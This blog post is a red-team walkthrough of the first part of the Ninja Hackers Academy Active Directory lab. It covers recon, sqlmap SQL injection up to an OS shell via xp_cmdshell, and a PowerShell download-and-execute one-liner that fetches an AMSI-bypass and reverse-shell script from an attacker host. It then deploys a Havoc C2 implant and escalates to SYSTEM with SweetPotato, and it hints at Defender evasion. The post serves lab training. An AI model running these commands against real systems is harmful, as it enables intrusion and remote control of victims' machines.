<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="AD Pwnage: Ninja Hackers Academy Part 1" /><meta name="author" content="crypt0ace" /><meta property="og:locale" content="en" /><meta name="description" content="Hacking into NHA - AD based Lab Red Team way." /><meta property="og:description" content="Hacking into NHA - AD based Lab Red Team way." /><link rel="canonical" href="https://crypt0ace.github.io/posts/NHA-Part-1/" /><meta property="og:url" content="https://crypt0ace.github.io/posts/NHA-Part-1/" /><meta property="og:site_name" content="Crypt0ace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-01-13T00:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="AD Pwnage: Ninja Hackers Academy Part 1" /><meta name="twitter:site" content="@crypt0acee" /><meta name="twitter:creator" content="@crypt0ace" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"crypt0ace"},"dateModified":"2024-01-13T00:00:00+05:00","datePublished":"2024-01-13T00:00:00+05:00","description":"Hacking into NHA - AD based Lab Red Team way.","headline":"AD Pwnage: Ninja Hackers Academy Part 1","mainEntityOfPage":{"@type":"WebPage","@id":"https://crypt0ace.github.io/posts/NHA-Part-1/"},"url":"https://crypt0ace.github.io/posts/NHA-Part-1/"}</script><title>AD Pwnage: Ninja Hackers Academy Part 1 | Crypt0ace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Crypt0ace"><meta name="application-name" content="Crypt0ace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Crypt0ace</a></div><div class="site-subtitle font-italic">A Cybersecurity Blog by Ahmed Sher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/crypt0ace" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/crypt0acee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ahmedsherfreelance','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>AD Pwnage: Ninja Hackers Academy Part 1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>AD Pwnage: Ninja Hackers Academy Part 1</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1705086000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 13, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Ahmed Sher </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1226 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In these series of posts we are going to look into an AD lab called <strong>Ninja Hackers Academy</strong> (NHA) which can be found <a href="https://github.com/Orange-Cyberdefense/GOAD">here</a>. This is part of some great Active Directory labs from <a href="https://github.com/Orange-Cyberdefense">OrangeCyberDefense</a> on Github. I highly recommend checking out GOAD to learn many many cool ways of Active Directory Hacking as a beginner. You can also follow the writeups of GOAD from <a href="https://mayfly277.github.io/">here</a> by the author <strong>mayfly277</strong>. <br /> Lets get into it. NHA is built as a challenge lab and no writeups are provided. So this is going to be writeup for these. Bear in mind these are somewhat hardened machines and Defender is enabled on all the machines.</p><p><img data-src="/assets/img/NHA/nha-readme.png" alt="NHA Readme" data-proofer-ignore></p><h2 id="initial-recon-and-access"><span class="mr-2">Initial Recon and Access</span><a href="#initial-recon-and-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>So we are starting with the scope of subnet of <em>192.168.58.0/24</em>. We can start the initial scan using nmap to see what ports are open on what machines.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 192.168.58.0/24 <span class="nt">-Pn</span> <span class="nt">-oA</span> allports.nmap
</pre></table></code></div></div><p>We have a list of IPs that are up.</p><ul><li>192.168.58.10<li>192.168.58.20<li>192.168.58.21<li>192.168.58.22<li>192.168.58.23</ul><p>We can see from the port scan that most of these are usual AD ports.</p><p><img data-src="/assets/img/NHA/allports.png" alt="Nmap Scan" data-proofer-ignore> <br /> We can check out the web server on port 80.</p><p><img data-src="/assets/img/NHA/webserver.png" alt="Webserver" data-proofer-ignore> <br /> So the first one is a DC by a look at the port 88 which is kerberos being open. We can see that the machine 192.168.58.21 has a port open as well. It is also stated as the starting point in the README.md file so we will have a look at that. Before doing so I can also scan the subnet using <em>netexec</em> (which is the same as CrackMapExec and can be found <a href="https://github.com/Pennyw0rth/NetExec">here</a>) to get basic information on the domain. <br /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netexec smb 192.168.58.0/24
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/netexec.png" alt="NetExec" data-proofer-ignore></p><p>So we can see that we have the same IPs up. The <em>192.168.58.20</em> is the domain controller for <code class="language-plaintext highlighter-rouge">ACADEMY.NINJA.LAN</code> and <em>192.168.58.10</em> is the DC for the domain <code class="language-plaintext highlighter-rouge">NINJA.HACK</code> guessing from the SMB signing being enabled. In case of a wider scope I’d have to manually find that out or confirm from the <em>nmap</em> scan. From the initial point I can guess that we would be initially working our way in the <code class="language-plaintext highlighter-rouge">ACADEMY.NINJA.LAN</code> domain. I can add these to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> files as well so I can have some DNS resolution. <br /> Going the web server we are greeted with a academy page.</p><p><img data-src="/assets/img/NHA/web.png" alt="Web" data-proofer-ignore> Looking around I can see that there is a weird URL that almost seems like a direct SQL query. We can also see the usernames. We can try to make a list by following the context as in the about us page which is firstname.lastname. But we can do this later as well. <img data-src="/assets/img/NHA/sql_web.png" alt="SQL Query in URL" data-proofer-ignore> We can try the UNION Based SQL Injection here. First we have to figure out the number of columns.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://web.academy.ninja.lan/Students?SearchString=&amp;orderBy=5--
</pre></table></code></div></div><p>This gives out an error while 4 doesnt. Now we can go the route to manually extract data. Or we could just throw SQLMap to it and it will also help us to get a shell. Using this command.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://192.168.100.58/Students?SearchString=&amp;orderBy=Firstname'</span> <span class="nt">--current-db</span> <span class="nt">--batch</span> <span class="nt">--threads</span> 10
</pre></table></code></div></div><p>This returns the current database as <code class="language-plaintext highlighter-rouge">academy</code>. We can try to see if we have the privileges and if we can run <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> to run system commands on the machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://192.168.100.58/Students?SearchString=&amp;orderBy=Firstname'</span> <span class="nt">--os-shell</span> <span class="nt">--batch</span> <span class="nt">--threads</span> 10
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/os_shell.png" alt="SQLMap OS Shell" data-proofer-ignore> We can also check to see whats happening behind hte scenes. For that, we can run the same command but this time after providing it the proxy of burpsuite so we can intercept the request that it makes to run OS commands.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://192.168.100.58/Students?SearchString=&amp;orderBy=Firstname'</span> <span class="nt">--os-shell</span> <span class="nt">--batch</span> <span class="nt">--threads</span> 10 <span class="nt">--proxy</span><span class="o">=</span>127.0.0.1:8080
</pre></table></code></div></div><p>From this shell we can run commands and get their output. Here I am straight up going to try and get a reverse shell up. I am using 2 powershell scripts. In this order:</p><ul><li>safe.ps1 - Has an AMSI Bypass and calls <code class="language-plaintext highlighter-rouge">call.ps1</code><li>call.ps1 - Has a modified version of nishang shell <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcpOneLine.ps1</code></ul><p>After setting up a simple python server</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python <span class="nt">-m</span> http.server 80
</pre></table></code></div></div><p>Then we can use this command to run the powershell script. This also bypasses the new <code class="language-plaintext highlighter-rouge">cmdline</code> detection byt defender.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell <span class="nt">-exec</span> bypass <span class="nt">-c</span> <span class="s2">"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.58.50/safe.ps1') -UseBasicParsing | iex"</span>
</pre></table></code></div></div><p>We can see the SQLMap making a database connection and trying to execute <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> module. <img data-src="/assets/img/NHA/sqlmap_os.png" alt="SQLMap OS Shell BurpSuite" data-proofer-ignore></p><p>If we decode it from URL using CyberChef we get this. <img data-src="/assets/img/NHA/sqlmap_xp.png" alt="Payload URL Decode" data-proofer-ignore></p><p>It declaring a variable with a character set of 8000 characters enough to fit in our payload. Then it is adding some hex value in it and using <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> to execute that. If we convert this value from hex, we get our payload. <img data-src="/assets/img/NHA/xpcmdshell_payload.png" alt="Payload Hex Decode" data-proofer-ignore></p><p>And after running this we get a shell back at out netcat prompt from the IP <em>192.168.58.22</em>. Its a bit broken and sad but we can fix it. <img data-src="/assets/img/NHA/nc_shell.png" alt="Netcat Shell" data-proofer-ignore></p><p>Right. So make it better and have some sort of ease into managing the different shells that we are going to get, we are going to use a Command and Control, otherwise known as a C2. There are many popular ones, including both free and paid. For this lab we are going with <a href="https://github.com/HavocFramework/Havoc">Havoc</a> built by <a href="https://twitter.com/C5pider">C5pider</a>. Its a really good C2 that is open source (so free) which would be way more than enough for this lab. <br /> One thing to note, sometimes the default payload built by Havoc might not work. It might get detected because its open source and signatures get built fast to detect these. You might have some luck if you use a mixture of parameters that you can change in Havoc payload generator and spice up your profile to use with the C2 and get better results. You could also build a custom loader for this. THere are many many great resources and research available for the one looking in the right direction. With a little knowledge, bypassing Defender shouldn’t be any issue. Look around for it. <br /> We are going to try and upload our binary to the web server using this netcat session and execute it. Putting artifacts on disk is never a good option, red teaming wise. But in this case I’m just gonna let that slide…</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>iwr http://192.168.58.50/demon.exe <span class="nt">-o</span> C:<span class="se">\t</span>mp<span class="se">\d</span>emon.exe
</pre></table></code></div></div><p>And then just execute it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:<span class="se">\t</span>mp<span class="se">\d</span>emon.exe
</pre></table></code></div></div><p>After a couple of seconds we get the first callback. We can run the following command and get information about our current session. (Running whoami.exe? bad opsec bro).</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>shell <span class="nb">whoami</span> /all
</pre></table></code></div></div><p>This is what we get <img data-src="/assets/img/NHA/whoami.png" alt="whoami" data-proofer-ignore></p><p>We can see that we dont exactly have a SYSTEM level shell but instead a <em>network service</em> user. This happens when we get a shell from other sources. So an IIS shell would most probably be something like <em>iisapppol</em>. These usually have the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> enabled by default because they have to impersonate the user in context of who is running it. This is what we can abuse to impersonate an SYSTEM user and get a shell with that.</p><h2 id="escalating-our-way-to-system"><span class="mr-2">Escalating our way to SYSTEM</span><a href="#escalating-our-way-to-system" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can use <a href="https://github.com/CCob/SweetPotato">SweetPotato.exe</a> to get a shell as SYSTEM in this case. This is being used from the awesome repository by <a href="https://twitter.com/Flangvik">Melvin Langvik</a>’s github called <a href="https://github.com/Flangvik/SharpCollection/">SharpCollection</a>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dotnet inline-execute /opt/SharpCollection/NetFramework_4.7_Any/SweetPotato.exe <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe <span class="nt">-a</span> <span class="s2">"C:</span><span class="se">\t</span><span class="s2">mp</span><span class="se">\d</span><span class="s2">emon.exe"</span>
</pre></table></code></div></div><p>Just like that, we get a second callback with our SYSTEM shell.</p><p><img data-src="/assets/img/NHA/system.png" alt="SYSTEM Shell" data-proofer-ignore></p><p>Right so, we got one machine. I’m gonna sign off on this. In the next part, we are going to see some pivoting. If theres any questions of any sort, or wanna talk about something I can be found on <a href="https://twitter.com/crypt0acee">Twitter</a> and <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/">LinkedIn</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" class="post-tag no-text-decoration" >Red Team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=AD+Pwnage%3A+Ninja+Hackers+Academy+Part+1+-+Crypt0ace&url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FNHA-Part-1%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=AD+Pwnage%3A+Ninja+Hackers+Academy+Part+1+-+Crypt0ace&u=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FNHA-Part-1%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FNHA-Part-1%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/NHA-Part-3/">AD Pwnage: Ninja Hackers Academy Part 3</a><li><a href="/posts/NHA-Part-2/">AD Pwnage: Ninja Hackers Academy Part 2</a><li><a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/">Using D/Invoke for Offensive Tool Development in C#</a><li><a href="/posts/Staying-under-the-Radar-Part-2/">Staying Under the Radar - Part 2 - Hiding IAT using Delegates</a><li><a href="/posts/Shellcode-Injection-Techniques/">Shellcode Injection in C# - Part 1 - Process Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-2/"><div class="card-body"> <em class="small" data-ts="1662663600" data-df="ll" > Sep 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 2 - Process Hollowing</h3><div class="text-muted small"><p> Introduction This post is part 2 of shellcode injection techniques. You can read part 1 here. In this one, we will look into Process Hollowing in C#. Process Hollowing Process Hollowing is a techn...</p></div></div></a></div><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/"><div class="card-body"> <em class="small" data-ts="1663268400" data-df="ll" > Sep 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</h3><div class="text-muted small"><p> Introduction In this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to ope...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar/"><div class="card-body"> <em class="small" data-ts="1663441200" data-df="ll" > Sep 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs</h3><div class="text-muted small"><p> Introduction In this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microso...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/" class="btn btn-outline-primary" prompt="Older"><p>Using D/Invoke for Offensive Tool Development in C#</p></a> <a href="/posts/NHA-Part-2/" class="btn btn-outline-primary" prompt="Newer"><p>AD Pwnage: Ninja Hackers Academy Part 2</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/crypt0acee">Ahmed Sher</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
